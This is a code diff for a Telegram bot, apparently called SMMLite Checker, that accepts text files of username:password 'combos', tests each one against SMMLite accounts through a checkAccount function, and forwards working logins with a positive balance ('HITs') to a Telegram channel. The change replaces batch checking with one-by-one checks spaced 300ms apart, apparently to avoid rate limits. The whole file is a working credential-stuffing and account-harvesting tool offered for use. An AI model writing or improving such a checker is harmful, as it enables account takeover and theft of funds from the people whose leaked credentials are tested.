@@ -1,7 +1,6 @@
-// api/telegram.js – SMMLite with batch processing and fixed HIT detection
+// api/telegram.js – SMMLite (serial processing with 300ms delay, like 10MS)
+import { checkAccount } from '../lib/checkCore.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
-
-const BATCH_SIZE = 50;
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -16,7 +15,7 @@ export default async function handler(req, res) {
   const document = body.message.document;
 
   if (text === '/start') {
-    await sendMessage(chatId, "🤖 SMMLite Checker Bot\nSend a .txt file with combos (user:pass each line).\nI'll check in batches and forward HITs (balance ≥ $0.003) to the channel.");
+    await sendMessage(chatId, "🤖 SMMLite Checker Bot\nSend a .txt file with combos (user:pass each line).\nI'll check one by one with a small delay and forward HITs (balance ≥ $0.003) to the channel.");
     return res.status(200).json({ ok: true });
   }
 
@@ -43,7 +42,7 @@ export default async function handler(req, res) {
       if (idx === -1) continue;
       const user = trimmed.slice(0, idx).trim();
       const pass = trimmed.slice(idx+1).trim();
-      if (user && pass) combos.push(`${user}:${pass}`);
+      if (user && pass) combos.push({ username: user, password: pass });
     }
 
     if (combos.length === 0) {
@@ -51,42 +50,32 @@ export default async function handler(req, res) {
       return res.status(200).json({ ok: false });
     }
 
-    await sendMessage(chatId, `📥 Received ${combos.length} combos. Checking in batches of ${BATCH_SIZE}...`);
+    await sendMessage(chatId, `📥 Received ${combos.length} combos. Checking one by one...`);
 
-    let totalHits = 0;
-    let totalChecked = 0;
-    const allHits = [];
+    let hits = [];
+    let total = combos.length;
+    let current = 0;
 
-    // ব্যাচে প্রসেস
-    for (let i = 0; i < combos.length; i += BATCH_SIZE) {
-      const batch = combos.slice(i, i + BATCH_SIZE);
-      const batchNum = Math.floor(i / BATCH_SIZE) + 1;
-      const totalBatches = Math.ceil(combos.length / BATCH_SIZE);
-
-      const results = await checkBatch(batch);
-      
-      for (const res of results) {
-        totalChecked++;
-        if (res.valid && res.hit) {
-          totalHits++;
-          // combo থেকে ইউজারনেম ও পাসওয়ার্ড আলাদা
-          const [username, password] = res.combo.split(':');
-          allHits.push({ ...res, username, password });
-          await forwardToChannel(username, password, res);
-        }
+    for (const combo of combos) {
+      current++;
+      const result = await checkAccount(combo.username, combo.password);
+      if (result.hit) {
+        hits.push({ ...combo, result });
+        await forwardToChannel(combo.username, combo.password, result);
       }
-
-      if (totalBatches > 1) {
-        await sendMessage(chatId, `⏳ Batch ${batchNum}/${totalBatches} done (${Math.min(i + BATCH_SIZE, combos.length)}/${combos.length}) | Hits so far: ${totalHits}`);
+      // প্রতি ৫টি বা শেষে প্রগ্রেস আপডেট
+      if (current % 5 === 0 || current === total) {
+        await sendMessage(chatId, `⏳ Progress: ${current}/${total} | Hits so far: ${hits.length}`);
       }
+      // ৩০০ms ডিলে (10 Minute School-এর মতো)
+      await new Promise(r => setTimeout(r, 300));
     }
 
-    // সারাংশ
-    let summary = `✅ Checking complete!\nTotal: ${combos.length}\n💰 HITS: ${totalHits}\n`;
-    if (allHits.length > 0) {
+    let summary = `✅ Checking complete!\nTotal: ${total}\n💰 HITS: ${hits.length}\n`;
+    if (hits.length > 0) {
       summary += `\n📋 HIT combos:\n`;
-      allHits.forEach(h => {
-        summary += `${h.username}:${h.password} | $${parseFloat(h.balance).toFixed(6)}\n`;
+      hits.forEach(h => {
+        summary += `${h.username}:${h.password} | $${parseFloat(h.result.balance).toFixed(6)}\n`;
       });
     }
     await sendMessage(chatId, summary);
@@ -96,29 +85,7 @@ export default async function handler(req, res) {
   return res.status(200).json({ ok: true });
 }
 
-// ---------- ব্যাচ চেক ফাংশন ----------
-async function checkBatch(batch) {
-  try {
-    const baseUrl = process.env.VERCEL_URL 
-      ? `https://${process.env.VERCEL_URL}` 
-      : 'https://smmlitetgversion.vercel.app';
-    
-    const response = await fetch(`${baseUrl}/api/check`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ combos: batch })
-    });
-    const data = await response.json();
-    return data.results || [];
-  } catch (err) {
-    return batch.map(combo => {
-      const [username, password] = combo.split(':');
-      return { combo, username, password, valid: false, hit: false, balance: 0, message: `Error: ${err.message}` };
-    });
-  }
-}
-
-// ---------- হেল্পার ফাংশন ----------
+// ---------- হেল্পার ফাংশন (আগের মতো) ----------
 async function sendMessage(chatId, text) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
